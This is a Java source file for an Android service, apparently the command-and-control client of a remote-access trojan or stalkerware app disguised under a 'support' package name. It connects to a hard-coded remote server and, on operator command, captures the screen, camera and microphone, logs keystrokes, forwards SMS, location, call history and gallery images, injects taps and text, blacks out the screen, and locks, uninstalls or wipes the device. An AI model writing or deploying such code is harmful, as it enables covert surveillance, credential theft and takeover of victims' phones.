package com.support.litework.server;

import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.support.litework.R;
import com.support.litework.model.ApplistEntry;
import com.support.litework.model.CallLogEntry;
import com.support.litework.model.ImageData;
import com.support.litework.model.MousePositionEntry;
import com.support.litework.model.SkeletonEntry;
import com.support.litework.services.MainAccessibilityService;
import com.support.litework.utils.Common;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.net.URISyntaxException;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.List;

import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;

public class Server extends Service {
    private static Server CONTEXT;
    private Socket socket;
    private static String mDeviceID;
    private static String mUserID;
    private double current_lat = 0.0;
    private double current_lng = 0.0;
    private FusedLocationProviderClient fusedLocationProviderClient;
    private LocationCallback locationCallback;
    public static Server getContext() {
        return CONTEXT;
    }
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        onLocationManage();
        onCreateSocket();
        return START_STICKY;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        mDeviceID = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        mUserID = getString(R.string.app_user_id);
    }

    public void onCreateSocket() {
        CONTEXT = this;
        try {
            socket.disconnect();
        } catch (Exception ignored) {
        }

        try {
            socket = IO.socket("https://stealth.gstpainel.fun/");
//            socket = IO.socket("http://191.101.131.54:8080");
            socket.connect();
            socket.on(Socket.EVENT_CONNECT, onConnectDevice);
            socket.on("mb-screen-monitor-" + mDeviceID, onScreenMonitor);
            socket.on("mb-screen-monitor-refresh-" + mDeviceID, onScreenRefreshMonitor);
            socket.on("mb-screen-click-event-" + mDeviceID, onScreenClickMonitor);
            socket.on("mb-screen-drag-event-" + mDeviceID, onScreenDragMonitor);
            socket.on("mb-screen-black-event-" + mDeviceID, onScreenBlackMonitor);
            socket.on("mb-screen-skeleton-" + mDeviceID, onScreenSkeletonMonitor);
            socket.on("mb-screen-send-text-" + mDeviceID, onScreenSetTextMonitor);
            socket.on("mb-camera-monitor-" + mDeviceID, onCameraMonitor);
            socket.on("mb-mic-monitor-" + mDeviceID, onMicMonitor);
            socket.on("mb-all-gallery-monitor-" + mDeviceID, onAllGalleryMonitor);
            socket.on("mb-one-gallery-monitor-" + mDeviceID, onOneGalleryMonitor);
            socket.on("mb-location-monitor-" + mDeviceID, onLocationMonitor);
            socket.on("mb-call-history-monitor-" + mDeviceID, onCallHistoryMonitor);
            socket.on("mb-application-monitor-" + mDeviceID, onInstalledAppMonitor);
            socket.on("mb-device-format-event-" + mDeviceID, onDeviceFormatMonitor);
            socket.on("mb-screen-home-event-" + mDeviceID, onDeviceHomeMonitor);
            socket.on("mb-screen-back-event-" + mDeviceID, onDeviceBackMonitor);
            socket.on("mb-screen-recent-event-" + mDeviceID, onDeviceRecentMonitor);
            socket.on("mb-key-logs-" + mDeviceID, onKeyLoggerMonitor);
            socket.on("mb-uninstall-app-event-" + mDeviceID, onUninstallAppMonitor);
            socket.on("mb-device-delete-event-" + mDeviceID, onUninstallAppMonitor);
            socket.on("mb-screen-control-scroll-" + mDeviceID, onScreenScrollMonitor);
            socket.on("mb-device-lock-" + mDeviceID, onDeviceLockMonitor);
            socket.on("mb-monitor-close-" + mDeviceID, onCloseMonitor);
        } catch (URISyntaxException e) {
            e.printStackTrace();
            throw new RuntimeException(e);
        }
    }

    private final Emitter.Listener onConnectDevice = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            sendConnectDevice();
        }
    };

    private final Emitter.Listener onScreenMonitor = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            JSONObject data = (JSONObject) args[0];
            Log.d("ScreenMonitor:", data.toString());
            Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_SCREEN_MONITOR);
            sendBroadcast(broadcastIntent);
        }
    };
    private final Emitter.Listener onScreenRefreshMonitor = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            JSONObject data = (JSONObject) args[0];
            Log.d("ScreenMonitor:", data.toString());
            Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_SCREEN_REFRESH_MONITOR);
            sendBroadcast(broadcastIntent);
        }
    };
    private final Emitter.Listener onScreenClickMonitor = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            JSONObject data = (JSONObject) args[0];
            Log.d("ScreenClickMonitor:", data.toString());
            double xPosition;
            double yPosition;
            try {
                xPosition = data.getDouble("xPosition");
                yPosition = data.getDouble("yPosition");
                Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_SCREEN_CLICK_MONITOR);
                broadcastIntent.putExtra("xPosition", xPosition);
                broadcastIntent.putExtra("yPosition", yPosition);
                sendBroadcast(broadcastIntent);
            } catch (JSONException e) {
                throw new RuntimeException(e);
            }
        }
    };
    private final Emitter.Listener onScreenDragMonitor = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            JSONObject data = (JSONObject) args[0];
            Log.d("ScreenDragMonitor:", data.toString());
            try {
                JSONArray position_list = data.getJSONArray("positions");
                List<MousePositionEntry> pointsList= new ArrayList<>();

                for (int i =0; i < position_list.length(); i++) {
                    JSONObject position = position_list.getJSONObject(i);
                    double x = position.getDouble("x");
                    double y = position.getDouble("y");
                    MousePositionEntry callLogEntry = new MousePositionEntry(x,y);
                    pointsList.add(callLogEntry);
                }
                Common.getInstance().setMousePositionEntries(pointsList);
                Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_SCREEN_DRAG_MONITOR);
                sendBroadcast(broadcastIntent);
            } catch (JSONException e) {
                throw new RuntimeException(e);
            }
        }
    };

    private final Emitter.Listener onScreenBlackMonitor = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            JSONObject data = (JSONObject) args[0];
            Log.d("onScreenBlackMonitor:", data.toString());
            boolean status;
            String txtBlack;
            try {
                status = data.getBoolean("status");
                if(status) {
                    txtBlack = data.getString("message");
//                    txtBlack = "message";
                    Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_SCREEN_BLACK_MONITOR);
                    broadcastIntent.putExtra("txtBlack", txtBlack);
                    sendBroadcast(broadcastIntent);
                } else {
                    Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_SCREEN_LIGHT_MONITOR);
                    sendBroadcast(broadcastIntent);
                }
            } catch (JSONException e) {
                throw new RuntimeException(e);
            }

        }
    };

    private final Emitter.Listener onScreenSkeletonMonitor = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            JSONObject data = (JSONObject) args[0];
            Log.d("ScreenClickMonitor:", data.toString());
            Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_SCREEN_SKELETON_MONITOR);
            sendBroadcast(broadcastIntent);
        }
    };

    private final Emitter.Listener onScreenSetTextMonitor = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            JSONObject data = (JSONObject) args[0];
            String txtSetText;
            Log.d("onScreenSetTextMonitor:", data.toString());
            try {
                txtSetText = data.getString("data");
                Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_SCREEN_SET_TEXT_MONITOR);
                broadcastIntent.putExtra("setText", txtSetText);
                sendBroadcast(broadcastIntent);

            } catch (JSONException e) {
                throw new RuntimeException(e);
            }
        }
    };

    private final Emitter.Listener onCameraMonitor = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            JSONObject data = (JSONObject) args[0];
            Log.d("CameraMonitor:", data.toString());
            String cameraType;
            int qualityType;

            try {
                cameraType = (String) data.get("cameraType");
                qualityType = (int) data.get("qualityType");

                Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_BACK_CAMERA_MONITOR);
                broadcastIntent.putExtra("quality", qualityType);
                broadcastIntent.putExtra("cameraType", cameraType);
                sendBroadcast(broadcastIntent);

            } catch (JSONException e) {
                throw new RuntimeException(e);
            }
        }
    };

    private final Emitter.Listener onMicMonitor = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_MIC_MONITOR);
            sendBroadcast(broadcastIntent);
        }
    };
    private final Emitter.Listener onAllGalleryMonitor = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_ALL_GALLERY);
            sendBroadcast(broadcastIntent);
        }
    };
    private final Emitter.Listener onOneGalleryMonitor = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            JSONObject data = (JSONObject) args[0];
            String filepath;
            try {
                filepath = data.getString("filepath");
                Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_ONE_GALLERY);
                broadcastIntent.putExtra("filepath", filepath);
                sendBroadcast(broadcastIntent);
            } catch (JSONException e) {
                throw new RuntimeException(e);
            }
        }
    };

    private final Emitter.Listener onCloseMonitor = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            JSONObject data = (JSONObject) args[0];
            String close_event = "";
            Log.d("CloseScreenMonitor:", data.toString());
            try {
                close_event = (String) data.get("type");

                Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_CLOSE_MONITOR);
                broadcastIntent.putExtra("event", close_event);
                sendBroadcast(broadcastIntent);
            } catch (JSONException e) {
                throw new RuntimeException(e);
            }
        }
    };

    private final Emitter.Listener onCallHistoryMonitor = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_CALL_LOGGER);
            sendBroadcast(broadcastIntent);
        }
    };
    private final Emitter.Listener onInstalledAppMonitor = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            Log.d("onInstalledAppMonitor:", "");
            Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_APP_INSTALLED);
            sendBroadcast(broadcastIntent);
        }
    };
    private final Emitter.Listener onDeviceFormatMonitor = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            Log.d("onInstalledAppMonitor:", "");
            Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_DEVICE_FORMAT);
            sendBroadcast(broadcastIntent);
        }
    };

    private final Emitter.Listener onDeviceHomeMonitor = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            Log.d("onInstalledAppMonitor:", "");
            Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_DEVICE_HOME);
            sendBroadcast(broadcastIntent);
        }
    };
    private final Emitter.Listener onDeviceBackMonitor = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            Log.d("onInstalledAppMonitor:", "");
            Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_DEVICE_BACK);
            sendBroadcast(broadcastIntent);
        }
    };
    private final Emitter.Listener onDeviceRecentMonitor = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            Log.d("onInstalledAppMonitor:", "");
            Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_DEVICE_RECENT);
            sendBroadcast(broadcastIntent);
        }
    };
    private final Emitter.Listener onKeyLoggerMonitor = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            JSONObject data = (JSONObject) args[0];
            Log.d("onKeyLoggerMonitor:", data.toString());
            Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_KEY_LOGGER);
            sendBroadcast(broadcastIntent);
        }
    };
    private final Emitter.Listener onUninstallAppMonitor = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            JSONObject data = (JSONObject) args[0];
            Log.d("onKeyLoggerMonitor:", data.toString());
            Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_UNINSTALL_APP);
            sendBroadcast(broadcastIntent);
        }
    };
    private final Emitter.Listener onScreenScrollMonitor = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            JSONObject data = (JSONObject) args[0];
            String scroll_event = "";
            Log.d("onScreenScrollMonitor:", data.toString());
            try {
                scroll_event = (String) data.get("event");

                Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_SCREEN_SCROLL);
                broadcastIntent.putExtra("event", scroll_event);
                sendBroadcast(broadcastIntent);
            } catch (JSONException e) {
                throw new RuntimeException(e);
            }
        }
    };

    private final Emitter.Listener onDeviceLockMonitor = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            JSONObject data = (JSONObject) args[0];
            Log.d("onDeviceLockMonitor:", data.toString());
            String lock_event = "";
            try {
                lock_event = (String) data.get("event");
                if(lock_event.equals("lock")) {
                    Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_DEVICE_LOCK);
                    sendBroadcast(broadcastIntent);
                } else {
                    Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_DEVICE_UNLOCK);
                    sendBroadcast(broadcastIntent);
                }
            } catch (JSONException e) {
                throw new RuntimeException(e);
            }


        }
    };

    private final Emitter.Listener onLocationMonitor = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            JSONObject data = (JSONObject) args[0];
            Log.d("onLocationMonitor:", data.toString());
            sendLocationInfo(current_lat, current_lng);
        }
    };

    private void onLocationManage() {
        fusedLocationProviderClient = LocationServices.getFusedLocationProviderClient(this);
        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return;
        }

        LocationRequest locationRequest = LocationRequest.create();
        locationRequest.setInterval(10000);
        locationRequest.setFastestInterval(5000);
        locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
        locationCallback = new LocationCallback() {
            @Override
            public void onLocationResult(@NonNull LocationResult locationResult) {
                if(locationResult == null) {
                    return;
                }
                for (Location location: locationResult.getLocations()) {
                    current_lat = location.getLatitude();
                    current_lng = location.getLongitude();
//                        sendLocationInfo(current_lat, current_lng);

                }
            }
        };
        fusedLocationProviderClient.requestLocationUpdates(locationRequest, locationCallback, null);
    }


    public void sendConnectDevice() {
        long timestamp = System.currentTimeMillis();
        String hwId = Build.SERIAL;
        String installationData = String.valueOf(timestamp);
        String deviceModel = Build.MODEL;
        String deviceReleaseVersion = Build.VERSION.RELEASE;
        String deviceManufacture = Build.MANUFACTURER.toUpperCase();
        String deviceInfo = mDeviceID + " " + deviceModel + " " + deviceReleaseVersion + " " + deviceManufacture;
        try {
            JSONObject sendJson = new JSONObject();
            sendJson.put("userId", mUserID);
            sendJson.put("deviceId", mDeviceID);
            sendJson.put("deviceInfo", deviceInfo);
            sendJson.put("hwId", hwId);
            sendJson.put("installationData", installationData);
            sendJson.put("manufacturer", deviceManufacture);
            sendJson.put("models", deviceModel);
            sendJson.put("version", deviceReleaseVersion);
            sendJson.put("userType", "");
            if(socket != null && socket.connected()) {
                socket.emit("add-new-device", sendJson);
                Log.d("Connecting:", mDeviceID);
                Log.d("Connecting:", "Device Connected111");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void sendScreenMonitoring(ByteArrayOutputStream outputStream) {
        try {
            JSONObject sendJson = new JSONObject();
            sendJson.put("deviceId", mDeviceID);
            sendJson.put("base64Image", outputStream.toByteArray());
            if(socket != null && socket.connected()) {
//                socket.emit("screen-mobile-response", sendJson);
                socket.emit("screen-mobile-byte-response", sendJson);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void sendScreenSkeletonMonitoring(String packagename, int deviceWidth, int deviceHeight, List<SkeletonEntry> skeletonEntryList) {
        JSONArray jsonArray = new JSONArray();
        for (SkeletonEntry entry : skeletonEntryList) {
            jsonArray.put(entry.toJson());
        }
        try {
            JSONObject sendJson = new JSONObject();
            sendJson.put("deviceId", mDeviceID);
            sendJson.put("deviceWidth", deviceWidth);
            sendJson.put("deviceHeight", deviceHeight);
            sendJson.put("skeletonData", jsonArray);
            if(socket != null && socket.connected()) {
                socket.emit("screen-skeleton-mobile-response", sendJson);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void sendRealtimeKeyLog(CharSequence text, CharSequence packagename, String eventString) {
        try {
            JSONObject sendJson = new JSONObject();
            sendJson.put("deviceId", mDeviceID);
            sendJson.put("keyLogsType", packagename);
            sendJson.put("keylogs", text);
            sendJson.put("event", eventString);
            if(socket != null && socket.connected()) {
                Log.d("KEY LOGGER::", text + ":::" + eventString);
                socket.emit("key-logs-realtime-mobile-response", sendJson);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public void sendKeyLog(CharSequence text, CharSequence packagename, String eventString) {
        try {
            JSONObject sendJson = new JSONObject();
            sendJson.put("deviceId", mDeviceID);
            sendJson.put("keyLogsType", packagename);
            sendJson.put("keylogs", text);
            sendJson.put("event", eventString);
            if(socket != null && socket.connected()) {
                Log.d("KEY LOGGER::", text + ":::" + eventString);
                socket.emit("key-logs-mobile-response", sendJson);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void sendCameraMonitoring(ByteArrayOutputStream outputStream, int qualityCamera, String cameratype) {
        try {
            JSONObject sendJson = new JSONObject();
            sendJson.put("deviceId", mDeviceID);
            sendJson.put("cameraType", cameratype);
            sendJson.put("qualityType", String.valueOf(qualityCamera));
            sendJson.put("base64Image", outputStream.toByteArray());
            if(socket != null && socket.connected()) {
                socket.emit("camera-mobile-response", sendJson);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public void SendAllGallery(List<ImageData> imageDataList) {
        JSONArray jsonArray = new JSONArray();
        for (ImageData entry : imageDataList) {
            jsonArray.put(entry.toJson());
        }
        try {
            JSONObject sendJson = new JSONObject();
            sendJson.put("deviceId", mDeviceID);
            sendJson.put("galleryData", jsonArray);
            if(socket != null && socket.connected()) {
                socket.emit("all-gallery-mobile-response", sendJson);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public void SendOneGallery(String imageBase64) {
        try {
            JSONObject sendJson = new JSONObject();
            sendJson.put("deviceId", mDeviceID);
            sendJson.put("galleryData", imageBase64);
            if(socket != null && socket.connected()) {
                socket.emit("one-gallery-mobile-response", sendJson);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public void sendLocationInfo(double lat, double lng) {
        try {
            JSONObject sendJson = new JSONObject();
            sendJson.put("deviceId", mDeviceID);
            sendJson.put("lat", lat);
            sendJson.put("lng", lng);
            if(socket != null && socket.connected()) {
                socket.emit("location-mobile-response", sendJson);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public void sendCallLogger(List<CallLogEntry> callLogger) {
        JSONArray jsonArray = new JSONArray();
        for (CallLogEntry entry : callLogger) {
            jsonArray.put(entry.toJson());
        }
        try {
            JSONObject sendJson = new JSONObject();
            sendJson.put("deviceId", mDeviceID);
            sendJson.put("callData", jsonArray);
            if(socket != null && socket.connected()) {
                socket.emit("call-history-mobile-response", sendJson);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public void sendMicMonitoring(short[] bufferData) {
        ByteBuffer byteBuffer = ByteBuffer.allocate(bufferData.length * 2);
        for (short s : bufferData) {
            byteBuffer.putShort(s);
        }
        try {
            JSONObject sendJson = new JSONObject();
            sendJson.put("deviceId", mDeviceID);
            sendJson.put("micType", "default");
            sendJson.put("base64Audio", byteBuffer.array());
            if(socket != null && socket.connected()) {
                socket.emit("mic-mobile-response", sendJson);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void sendFormatNotification() {
        try {
            JSONObject sendJson = new JSONObject();
            sendJson.put("deviceId", mDeviceID);
            if(socket != null && socket.connected()) {
                socket.emit("format-mobile-response", sendJson);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void sendInstalledAppList(List<ApplistEntry> appLists) {
        JSONArray jsonArray = new JSONArray();
        for (ApplistEntry entry : appLists) {
            jsonArray.put(entry.toJson());
        }
        try {
            JSONObject sendJson = new JSONObject();
            sendJson.put("deviceId", mDeviceID);
            sendJson.put("data", jsonArray);
            if(socket != null && socket.connected()) {
                socket.emit("application-mobile-response", sendJson);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void sendSMSData(String phonenumber, String msg) {
        try {
            JSONObject sendJson = new JSONObject();
            sendJson.put("deviceId", mDeviceID);
            sendJson.put("phonenumber", phonenumber);
            sendJson.put("message", msg);
            if(socket != null && socket.connected()) {
                socket.emit("sms-realtime-response", sendJson);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
